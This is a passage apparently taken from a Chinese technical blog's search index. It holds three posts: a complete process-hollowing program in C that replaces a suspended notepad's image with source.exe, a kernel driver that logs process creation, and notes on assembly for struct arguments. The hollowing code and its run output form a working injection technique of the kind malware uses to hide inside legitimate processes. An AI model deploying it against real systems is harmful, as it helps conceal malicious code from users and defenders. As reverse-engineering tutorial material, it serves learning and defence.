让挂起的notepad恢复运行最后，使用ResumeThread恢复notepad的运行： 1234ResumeThread(pi.hThread);printf(&quot;Injected!\\n&quot;);WaitForSingleObject(pi.hThread, INFINITE);printf(&quot;Wait Complete!\\n&quot;); 然后就能发现，运行的并不是notepad程序，而是一个弹窗程序，这就说明成功进行了进程的替换。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //读取DOS文件头，获取e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //获取映像头 PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //根据可选头的SizeOfImage分配内存 unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //获取节表起始位置 PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //将文件头复制到内存中 memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //将每一节的内容依次复制到内存中 for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;}int main() { //创建挂起的notepad进程 STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); //获取notepad进程的PEB地址 PROCESS_BASIC_INFORMATION processInfo; NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL); printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); //PEB的Reserved3[1]就是notepad进程加载的基地址 PEB processPeb; result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); void *originImageBase = processPeb.Reserved3[1]; printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase); system(&quot;pause&quot;); //unmap合法内存的代码 DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase); if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1; } //读取source.exe文件，将PE文件内容全部放入内存 FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;); if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1; } fseek(fptr, 0L, SEEK_END); long fileSize = ftell(fptr); rewind(fptr); BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000); if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1; } fread(fileBuf, 1, fileSize, fptr); fclose(fptr); //根据PE文件内容生成PE文件载入内存的状态 int ImageSize; ULONGLONG newImageBase; DWORD entryPoint; unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint); printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); //VirtualAllocEx申请一块内存加载source.exe void *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1; } //将source.exe写入notepad进程空间中 result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL); free(peMem); free(fileBuf); if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1; } //修改PEB中的ImageBase processPeb.Reserved3[1] = (PVOID)newImageBase; result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1; } //修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点 CONTEXT targetContext; targetContext.ContextFlags = CONTEXT_FULL; result = GetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } targetContext.Rcx = newImageBase + entryPoint; result = SetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } system(&quot;pause&quot;); ResumeThread(pi.hThread); printf(&quot;Injected!\\n&quot;); WaitForSingleObject(pi.hThread, INFINITE); printf(&quot;Wait Complete!\\n&quot;); return 0;} 编译运行： 12345678910111213141516171819202122&gt; cl hollow.c用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。hollow.chollow.c(1): warning C4819: 该文件包含不能在当前代码页(936)中表示的字符。请将该文件保存为 Unicode 格式以防止数据丢失Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:hollow.exehollow.obj&gt; hollowCreate Suspended notepad, pid: 10776PebBaseAddress: 000000FD3FB49000ImageBaseAddress: 00007FF6CA930000Press any key to continue . . .SizeOfImage: 0x20000, ImageBase: 0x140000000, AddressOfEntryPoint: 0x14fcPress any key to continue . . .Injected!Wait Complete!","link":"/2021/01/28/windows-process-hollowing/"},{"title":"利用Windows事件通知机制监控进程创建","text":"利用Windows内核提供的事件通知机制，可以对系统内某一类事件的操作进行监控。比如，可以通过PsSetCreateProcessNotifyRoutineEx函数注册一个创建进程的通知，从而实现对进程创建的监控。 本文主要参考《Windows内核编程》第21章。 PsSetCreateProcessNotifyRoutineEx的用法PsSetCreateProcessNotifyRoutineEx的函数原型为： 1234NTSTATUS PsSetCreateProcessNotifyRoutineEx( PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, BOOLEAN Remove); 其中NotifyRoutine为一个函数指针，这个函数的原型被规定为： 12345678PCREATE_PROCESS_NOTIFY_ROUTINE_EX PcreateProcessNotifyRoutineEx;void PcreateProcessNotifyRoutineEx( PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo){...} 这个函数被称为通知例程，只要发生了“进程创建或销毁”这一事件，这个PcreateProcessNotifyRoutineEx就会被调用一次，这样就实现了对进程创建的监控。 另一个参数为Remove，Remove为FALSE时，表示要进行注册一个通知；Remove为TRUE，表示要移除这个通知。因此，一般会在DriverEntry，即驱动的入口函数中调用PsSetCreateProcessNotifyRoutineEx时将Remove设置为FALSE；在DriverUnload，即驱动的卸载函数中再调用一次PsSetCreateProcessNotifyRoutineEx，此时需要将Remove设置为FALSE。 通知例程函数的参数说明通知例程函数有三个形参，通过这三个形参，就可以知道要创建（或销毁）的进程的一些基本信息。 ProcessId为要创建的进程对应的进程ID。 根据CreateInfo可以判断当前进行的是进程的创建还是销毁操作。如果要进行进程销毁操作，则CreateInfo的值会是NULL。因此，通过判断CreateInfo是否为NULL，可以得知要进行的操作是进程创建还是进程销毁。 进行进程创建操作时，CreateInfo的结构体定义为： 1234567891011121314151617typedef struct _PS_CREATE_NOTIFY_INFO { SIZE_T Size; union { ULONG Flags; struct { ULONG FileOpenNameAvailable : 1; ULONG IsSubsystemProcess : 1; ULONG Reserved : 30; }; }; HANDLE ParentProcessId; CLIENT_ID CreatingThreadId; struct _FILE_OBJECT *FileObject; PCUNICODE_STRING ImageFileName; PCUNICODE_STRING CommandLine; NTSTATUS CreationStatus;} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO; 从中可以得到进程的名字、参数、父进程ID等信息。 进程监控驱动程序编写函数和全局变量声明在程序的最开始先声明几个需要用到的函数和全局变量： 1234567#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程 DriverEntry12345678910111213NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;} DriverEntry的主要功能是调用PsSetCreateProcessNotifyRoutineEx，将ProcessNotify函数注册为进程创建的通知例程。 DriverUnload1234567VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;} 在卸载驱动模块时，需要再调用一次PsSetCreateProcessNotifyRoutineEx，将之前注册的事件通知移除。 ProcessNotify这一函数为进程创建或销毁的通知例程，每当发生进程创建或进程销毁时，这一函数都会被调用，内容为： 1234567891011VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} 函数会打印和进程有关的一些信息。 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} 编译时需要加上/INTEGRITYCHECK使用Visual Studio对驱动进行编译时，需要加上/INTEGRITYCHECK选项，否则PsSetCreateProcessNotifyRoutineEx会返回STATUS_ACCESS_DENIED错误码。 运行结果在虚拟机中禁用驱动程序强制签名，然后运行驱动，打开DbgView查看打印的结果： 上图为部分打印结果，驱动成功监测到notepad进程的创建和销毁。 通知例程的上下文在创建和销毁进程时，通知例程都会被调用，那么通知例程是在哪个进程中被调用的呢？根据《Windows内核编程》的说法： 对于进程创建通知来说，通知例程运行在创建该进程的线程上下文中，如果线程A调用应用层CreateProcess函数创建子进程B，那么通知例程就运行在A线程的上下文中。对于进程结束通知来说，通知例程运行在该进程中最后一个退出的线程的上下文中（一般是主线程）。 根据上面的运行结果也可以看出，当进程创建时，调用PsGetCurrentProcessId得到的进程ID（CurrentPID）是和父进程的ID相同的；而当进程结束时，PsGetCurrentProcessId得到的进程ID是和要销毁的进程ID相同的。不过也有进程创建时，CurrentPID和PPID不相等的情况。 进程是32位还是64位在内核驱动中，要想知道进程是32位还是64位，可以使用ZwQueryInformationProcess函数，但这个函数需要传入进程的句柄，所以在这之前要先想办法获取进程的句柄。现在已经有了指向进程对象的指针，类型为PEPROCESS，变量名为Process，因此可以使用ObOpenObjectByPointer得到这个进程对象的一个句柄： 12345status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //获取进程句柄if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break;} 接下来使用ZwQueryInformationProcess，但发现头文件中并没有这个函数，因此要使用MmGetSystemRoutineAddress找到这个函数。首先在文件开头定义全局变量存储ZwQueryInformationProcess的地址： 12345678typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcess函数地址 在DriverEntry中添加代码，对g_pZwQueryInformationProcess变量赋值： 1234567UNICODE_STRING uFuncName = { 0 };DriverObject-&gt;DriverUnload = DriverUnload;RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;);g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName);if (NULL == g_pZwQueryInformationProcess) { break;} 最后在通知例程中添加代码，使用ZwQueryInformationProcess判断其是32位进程还是64位进程： 1234567891011status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL);if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break;}if (isWOW64) { //32位进程 DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId);}else { //64位进程 DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId);} 添加了上面这些代码后，源代码为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;ntifs.h&gt;#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);/*全局变量定义*/ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcess函数地址BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { UNICODE_STRING uFuncName = { 0 }; DriverObject-&gt;DriverUnload = DriverUnload; RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;); g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName); if (NULL == g_pZwQueryInformationProcess) { break; } if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); HANDLE hProcess = NULL; NTSTATUS status = STATUS_UNSUCCESSFUL; ULONG_PTR isWOW64 = 0; do { status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //获取进程句柄 if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break; } status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL); if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break; } if (isWOW64) { //32位进程 DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId); } else { //64位进程 DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId); } } while (FALSE); if (NULL != hProcess) { ZwClose(hProcess); hProcess = NULL; } return;} 运行结果如下： 说明驱动程序可以分辨出32位和64位进程。","link":"/2021/04/05/windows-kernel-create-process-notify/"},{"title":"函数参数及返回值为结构体时的汇编代码","text":"本文记录了函数参数以及返回值是结构体时，汇编代码是什么样的。本文使用的编译器为Visual Studio中的cl.exe，版本为用于 x86 的 Microsoft (R) C/C++ 优化编译器 19.28.29910 版。 定义结构体定义这样一个结构体： 12345struct tagTest { int a; long long b; char c[4];}; 编译后，各成员的偏移为： 1234567tagTest struc ; (sizeof=0x18, mappedto_56) a dd ? field_4 dd ? b dq ? c db 4 dup(?) ; string(C) field_14 dd ?tagTest ends 其中field_4和field_14是填充，结构体大小为24字节。 函数参数为结构体编写函数并调用： 12345678910long long paramTest(int p1, struct tagTest p2, int p3) { return p1 + p2.a + p2.b + p3;}int main() { struct tagTest param = {0xAAAAAAAA, 0xBBBBBBBBCCCCCCCC, &quot;aaaa&quot;}; paramTest(1, param, 3); return 0;} 调用paramTest前将参数压入堆栈的汇编代码为： 1234567891011121314151617push 3sub esp, 24mov edx, espmov eax, [ebp+param.a]mov [edx], eaxmov ecx, [ebp+param.field_4]mov [edx+4], ecxmov eax, dword ptr [ebp+param.b]mov [edx+8], eaxmov ecx, dword ptr [ebp+param.b+4]mov [edx+12], ecxmov eax, dword ptr [ebp+param.c]mov [edx+16], eaxmov ecx, [ebp+param.field_14]mov [edx+20], ecxpush 1call paramTest 首先压入第三个参数3，然后将24字节的结构体全部复制到栈中，最后压入第一个参数1，所以在调用paramTest前栈的结构为： 总结：当函数参数为结构体时，在将参数压栈的过程中，结构体中的所有内容都会复制到栈中。 函数返回值为结构体编写函数并调用： 12345678910struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}int main() { struct tagTest result = retTest(0x11111111, 0x2222222233333333); return 0;} 调用retTest函数前将参数压栈的代码： 123456push 22222222hpush 33333333h ; bpush 11111111h ; alea edx, [ebp+retVal]push edx ; retstrcall retTest 除了函数原有的两个参数外，还压了位于栈中的结构体变量retVal的地址，命名为pRetVal。 进入retTest函数，这个函数有一个struct tagTest类型的局部变量，命名为tmp。函数开头的这段汇编代码将tmp赋值为{a, b, &quot;cccc&quot;}： 12345678mov eax, [ebp+a]mov [ebp+tmp.a], eaxmov ecx, [ebp+b_low]mov edx, [ebp+b_high]mov dword ptr [ebp+tmp.b], ecxmov dword ptr [ebp+tmp.b+4], edxmov eax, dword_419000 ; &quot;cccc&quot;mov dword ptr [ebp+tmp.c], eax 接下来这段汇编代码则将tmp的内容复制到pRetVal指向的结构体retVal： 12345678910111213mov ecx, [ebp+pRetVal]mov edx, [ebp+tmp.a]mov [ecx], edxmov eax, [ebp+tmp.field_4]mov [ecx+4], eaxmov edx, dword ptr [ebp+tmp.b]mov [ecx+8], edxmov eax, dword ptr [ebp+tmp.b+4]mov [ecx+0Ch], eaxmov edx, dword ptr [ebp+tmp.c]mov [ecx+10h], edxmov eax, [ebp+tmp.field_14]mov [ecx+14h], eax 函数的返回值为pRetVal： 1mov eax, [ebp+pRetVal] 总结：当函数返回值为结构体，函数的调用方main函数会在栈中预留一段空间retVal用于存放返回值。当main函数调用retTest函数时，除了本身的两个参数外，还会压入retVal的地址&amp;retVal。retTest函数会根据传入的retVal的地址，将返回值复制到retVal当中，并返回&amp;retVal。 使用IDA的Set type...功能也能看出这一点，如果在Set type...窗口输入： 1tagTest retTest(int a, long long b) IDA会将其自动转换为： 1tagTest *retTest(tagTest *__return_ptr __struct_ptr retstr, int a, __int64 b); 其中retstr就是指向retVal的指针。 下面这两个C语言函数编译后的汇编代码应该是一样的： 12345678910111213141516171819struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}struct tagTest *retTest2(struct tagTest *pRetVal, int a, long long b) { struct tagTest tmp = {a, b, &quot;cccc&quot;}; *pRetVal = tmp; return pRetVal;}int main() { struct tagTest result1 = retTest(0x11111111, 0x2222222233333333); struct tagTest retVal; struct tagTest *pRetVal = retTest2(&amp;retVal, 0x11111111, 0x2222222233333333); struct tagTest result2 = *pRetVal; return 0;}","link":"/2021/08/13/structure-function-parameter-return-value/"}],"tags":[{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"进程","slug":"进程","link":"/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"内存","slug":"内存","link":"/tags/%E5%86%85%E5%AD%98/"},{"name":"远程线程","slug":"远程线程","link":"/tags/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/"},{"name":"DLL注入","slug":"DLL注入","link":"/tags/DLL%E6%B3%A8%E5%85%A5/"},{"name":"线程","slug":"线程","link":"/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"重定位","slug":"重定位","link":"/tags/%E9%87%8D%E5%AE%9A%E4%BD%8D/"},{"name":"进程注入","slug":"进程注入","link":"/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"},{"name":"PE文件","slug":"PE文件","link":"/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"内核编程","slug":"内核编程","link":"/tags/%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/"},{"name":"通知与回调","slug":"通知与回调","link":"/tags/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%9B%9E%E8%B0%83/"},{"name":"逆向分析","slug":"逆向分析","link":"/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"},{"name":"结构体","slug":"结构体","link":"/tags/%E7%BB%93%E6%9E%84%E4%BD%93/"},{"name":"函数","slug":"函数","link":"/tags/%E5%87%BD%E6%95%B0/"}],"categories":[{"name":"Windows","slug":"Windows","link":"/categories/Windows/"},{"name":"Reverse","slug":"Reverse","link":"/categories/Reverse/"}]}